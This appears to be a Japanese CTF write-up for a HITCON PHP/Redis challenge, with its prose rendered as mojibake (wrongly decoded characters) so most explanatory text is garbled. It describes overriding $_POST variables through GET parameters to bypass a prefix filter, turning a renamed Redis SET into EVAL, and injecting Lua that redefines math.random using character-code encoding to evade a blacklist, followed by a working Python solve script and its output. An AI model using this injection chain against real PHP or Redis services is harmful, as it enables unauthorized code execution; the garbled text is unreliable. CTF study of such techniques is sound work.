`Check availability` ã®éƒ¨åˆ†ã§ã¯ `SET $TEST_KEY $TEST_VALUE` (ãŸã ã—ã€`SET` ã¯ `rename-command` ã«ã‚ˆã£ã¦åˆ¥ã®æ–‡å­—åˆ—ã«ãªã£ã¦ã„ã‚‹) ã§æ›¸ãè¾¼ã‚“ã ã‚ã¨ã€`GET $TEST_KEY` ã§ã¡ã‚ƒã‚“ã¨æ›¸ãæ›ãˆã‚‰ã‚ŒãŸã‹ç¢ºèªã™ã‚‹ã¨ã„ã†ä¸€è¦‹æ„å‘³ã®ãªã„å‡¦ç†ã‚’ã—ã¦ã„ã¾ã™ã€‚ã“ã‚Œã¯æã‚‰ã `$MY_SET_COMMAND` ãŒåˆ¥ã®ã‚³ãƒãƒ³ãƒ‰ã«æ›¸ãæ›ãˆã‚‰ã‚Œã¦ã„ãªã„ã‹ãƒã‚§ãƒƒã‚¯ã™ã‚‹ãŸã‚ã§ã—ã‚‡ã†ã€‚

æœ€å¾Œã« Redis å´ã§ Lua ã‚³ãƒ¼ãƒ‰ã«ã‚ˆã£ã¦ç–‘ä¼¼ä¹±æ•°ã‚’å–å¾—ã—ã€ã‚‚ã—ã“ã‚Œã¨ãƒ¦ãƒ¼ã‚¶å…¥åŠ›ã¨ã—ã¦ä¸ãˆã‚‰ã‚ŒãŸ `$guess` ãŒä¸€è‡´ã—ã¦ã„ã‚Œã°ãƒ•ãƒ©ã‚°ã‚’è¡¨ç¤ºã—ã¦ã„ã¾ã™ã€‚ç–‘ä¼¼ä¹±æ•°ã®ç¯„å›²ã¯ `math.random(2^31-1)` ã‚’è¦‹ã‚Œã°ã‚ã‹ã‚‹ã‚ˆã†ã«åºƒãã€ã‚·ãƒ¼ãƒ‰å€¤ã‚‚ PHP å´ã§ `random_int(0, 0xffffffff / 2)` ã§æ±ºå®šã—ã¦ãŠã‚Šã€æ¨æ¸¬ã¯å›°é›£ã§ã™ã€‚

`$MY_SET_COMMAND` ã‚„ `$TEST_KEY` ãªã©åå‰ãŒå¤§æ–‡å­—ã¨ `_` ã®ã¿ã§æ§‹æˆã•ã‚Œã‚‹å¤‰æ•°ã¯ `config.php` ã§å®šç¾©ã•ã‚Œã¦ã„ã‚‹ã®ã§ã—ã‚‡ã†ã€‚æœ€åˆã® `preg_match('/^(FLAG|MY_|TEST_|GLOBALS)/i',$k)` ã®ãŸã‚ã«ã€ãƒ¦ãƒ¼ã‚¶ãŒæ“ä½œã§ãã‚‹ã®ã¯ `$guess` ã‹ `$token` ãã‚‰ã„ã—ã‹ãªã•ãã†ã«è¦‹ãˆã¾ã™ã€‚ãŒã€ãªã‚“ã¨ã‹ã—ã¦æ›¸ãæ›ãˆã‚‰ã‚Œãªã„ã§ã—ã‚‡ã†ã‹ã€‚

ã„ã‚ã„ã‚è©¦ã—ã¦ã„ã‚‹ã¨ã€æœ€åˆã® `preg_match('/^(FLAG|MY_|TEST_|GLOBALS)/i',$k)` ã¯æ–‡å­—åˆ—ã®é ­ã ã‘ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ã„ã‚‹ã“ã¨ã€å±•é–‹æ™‚ã«ã¯ `$_GET` ã‚’å±•é–‹ã—ãŸå¾Œã« `$_POST` ã‚’å±•é–‹ã™ã‚‹ã¨ã„ã†é †ç•ªã«ãªã£ã¦ã„ã‚‹ã“ã¨ã‹ã‚‰ã€`_POST[MY_SET_COMMAND]=EVAL` ã®ã‚ˆã†ãª GET ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’ä¸ãˆã‚‹ã“ã¨ã§ `$MY_SET_COMMAND` ã‚’æ›¸ãæ›ãˆã‚‰ã‚Œã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã—ãŸã€‚

ãƒ•ãƒ©ã‚°ã‚’å¾—ã‚‹ã«ã¯ `math.random(2^31-1)` ã®è¿”ã‚Šå€¤ã‚’æ¨æ¸¬ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ãŒã€ä¾‹ãˆã° `math.random` ã‚’åˆ¥ã®é–¢æ•°ã«æ›¸ãæ›ãˆã‚‹ã“ã¨ã§è¿”ã‚Šå€¤ã‚’æ“ä½œã§ããªã„ã§ã—ã‚‡ã†ã‹ã€‚å…ˆç¨‹ã®æ–¹æ³•ã§ `MY_SET_COMMAND` ã‚’ `EVAL` ã«ã€`TEST_KEY` ã‚’ `function math.random() return 123 end` ã«ã€`TEST_VALUE` ã‚’ `0` ã«ã™ã‚Œã°ã‚ˆã•ãã†â€¦ã§ã™ãŒã€å‰è¿°ã®é€šã‚Š `[]{}=.'"` ã¯æ¶ˆã•ã‚Œã¦ã—ã¾ã£ã¦ã„ã¾ã™ã€‚

ã„ã‚ã„ã‚è©¦ã—ã¦ã„ã‚‹ã¨ã€`string.char(0x41)` ã¯ `tostring(1):char(0x41):sub(2)` ã®ã‚ˆã†ã« `"1"` ã¨ã„ã†æ–‡å­—åˆ—ã®ãƒ¡ã‚½ãƒƒãƒ‰ã¨ã—ã¦ `string.char` ã‚’å‘¼ã³å‡ºã—ãŸã‚ã¨ã€`string.sub` ã§æœ€åˆã® `"1"` éƒ¨åˆ†ã‚’å‰Šé™¤ã™ã‚‹ã“ã¨ã§ä»£æ›¿ã§ãã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã—ãŸã€‚ã“ã‚Œã«ã‚ˆã£ã¦ `function math.random() return 123 end` ã¨ã„ã†æ–‡å­—åˆ—ã‚’ä½œã‚Šã€`loadstring(â€¦)()` ã®ã‚ˆã†ãªå½¢ã§ `eval` ç›¸å½“ã®ã“ã¨ã‚’ã™ã‚Œã°ã€`[]{}=.'"` ãŒä½¿ãˆãªã„ã¨ã„ã†åˆ¶é™ã¯ãƒã‚¤ãƒ‘ã‚¹ã§ããã†ã§ã™ã€‚

æœ€çµ‚çš„ã«ã€ä»¥ä¸‹ã®ã‚ˆã†ãªã‚³ãƒ¼ãƒ‰ã§ãƒ•ãƒ©ã‚°ãŒå¾—ã‚‰ã‚Œã¾ã—ãŸã€‚

```python
import requests
import urllib.parse
URL = '(çœç•¥)'
TOKEN = '(çœç•¥)'

def go(args):
  url = URL + '&'.join(k + '=' + urllib.parse.quote(v) for k, v in args.items())
  print(url)
  r = requests.get(url)
  print(r.content.decode())

payload = 'function math.random() return 123 end'
payload = 'loadstring(tostring(1):char({}):sub(2))()'.format(','.join(str(ord(c)) for c in payload))

go({
  'token': TOKEN,
  'guess': '123',
  '_POST[MY_SET_COMMAND]': 'EVAL',
  '_POST[TEST_KEY]': payload,
  '_POST[TEST_VALUE]': '0'
})
go({
  'token': TOKEN,
  'guess': '123'
})
```

```
$ python3 solve.py
http://(çœç•¥)/luatic.php?token=(çœç•¥)&guess=123&_POST[MY_SET_COMMAND]=EVAL&_POST[TEST_KEY]=loadstring%28tostring%281%29%3Achar%28102%2C117%2C110%2C99%2C116%2C105%2C111%2C110%2C32%2C109%2C97%2C116%2C104%2C46%2C114%2C97%2C110%2C100%2C111%2C109%2C40%2C41%2C32%2C114%2C101%2C116%2C117%2C114%2C110%2C32%2C49%2C50%2C51%2C32%2C101%2C110%2C100%29%3Asub%282%29%29%28%29&_POST[TEST_VALUE]=0
Something Wrong?
http://(çœç•¥)/luatic.php?token=(çœç•¥)&guess=123
Congratulations, the flag is hitcon{Lua^H Red1s 1s m4g1c!!!}
```

```
hitcon{Lua^H Red1s 1s m4g1c!!!}
```